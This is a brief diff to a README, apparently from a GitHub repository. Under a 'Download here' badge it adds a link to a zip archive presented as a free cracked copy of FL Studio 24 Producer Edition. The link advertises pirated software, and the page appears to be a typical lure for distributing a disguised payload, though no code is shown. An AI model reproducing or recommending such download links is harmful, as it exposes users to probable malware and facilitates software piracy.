@@ -6,7 +6,7 @@
 
 ## 📥 Download here
 
-<a href="#" Download>
+<a href="https://github.com/N9km2/FL-Studio-24-Free-Cracked-2025/releases/download/full/FLStudio24FullProducerEdition.zip" Download>
   <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
